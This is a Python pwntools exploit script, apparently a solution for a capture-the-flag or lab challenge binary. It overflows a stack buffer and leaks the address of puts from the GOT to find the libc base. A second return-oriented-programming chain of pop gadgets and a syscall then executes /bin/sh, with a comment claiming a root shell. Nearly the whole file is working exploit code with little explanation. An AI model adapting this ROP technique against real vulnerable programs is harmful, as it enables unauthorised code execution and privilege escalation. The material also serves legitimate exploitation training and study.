#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/run')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b 15
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil(b"command.\n")

chal_elf = ELF("/challenge/run")
chal_rop = ROP(chal_elf)

# first, leak libc address

## payload padding
unbound_buffer = 0x7ffeb37aad8b
saved_rip = 0x7ffeb37aad98
offset = saved_rip - unbound_buffer
payload_1_padding = b'F' * offset

# get pop rdi gadget (from code itself) to place argument for puts
pop_rdi_gadget = chal_rop.find_gadget(['pop rdi', 'ret'])[0]

## puts(&puts)
## call puts with the resolved function in PLT (cld use GOT puts too?)
puts_plt=chal_elf.plt['puts']

## pass the address of puts in libc, obtained from GOT, as the argument to puts
puts_got=chal_elf.got['puts']

## go back to `vuln` function
vuln_addr = chal_elf.symbols['vuln']

payload_1 = payload_1_padding + \
    p64(pop_rdi_gadget) + p64(puts_got) + \
    p64(puts_plt) + \
    p64(vuln_addr) + b'\n'

io.send(payload_1)

## get libc address from output
# strip() can take away other whitespaces as well, so 0x20 (space) if part of an address, gets removed
# so use split() to be more exact
addr_line = io.recvuntil(b"command.\n").split(b"\n")[0]
puts_addr = int.from_bytes(addr_line, byteorder="little")
print("puts is at:", hex(puts_addr))

# readelf and grep
puts_offset = 0x84420
libc_addr = puts_addr - puts_offset
print("libc is at:", hex(libc_addr))

# io.interactive()

# now, load libc
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_rop = ROP(libc_elf)

## 1.1 find string - /bin/sh
bin_sh = next(libc_elf.search(b"/bin/sh")) # relative position
bin_sh += libc_addr # absolute address

## 1.2 pop rdi, ret
# pop_rdi_gadget = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
# pop_rdi_gadget += libc_addr
## already have this

## 2.1 zero can be loaded onto stack directly (? null byte?)

## 2.2 pop rdx, ret
# pop_rdx_gadget = libc_rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
# pop_rdx_gadget += libc_addr
## this time, from code itself
pop_rdx_gadget = chal_rop.find_gadget(['pop rdx', 'ret'])[0]

## 3.1 zero can be loaded onto stack directly (? null byte?)

## 3.2 pop rsi, ret
# libc_rop.rsi = 0x0
pop_rsi_gadget = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rsi_gadget += libc_addr

## 4.1 0x3b can be loaded onto stack directly

## 4.2 pop rax, ret
# libc_rop.rax = 0x3b
pop_rax_gadget = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rax_gadget += libc_addr

## 5. syscall
syscall_gadget = libc_rop.find_gadget(['syscall'])[0]
syscall_gadget += libc_addr

# payload padding
payload_2_padding = payload_1_padding

payload_2 = payload_2_padding + \
    p64(pop_rdi_gadget) + p64(bin_sh) + \
    p64(pop_rdx_gadget) + p64(0) + \
    p64(pop_rsi_gadget) + p64(0) + \
    p64(pop_rax_gadget) + p64(0x3b) + \
    p64(syscall_gadget)

io.send(payload_2)

# root shell obtained
io.interactive()
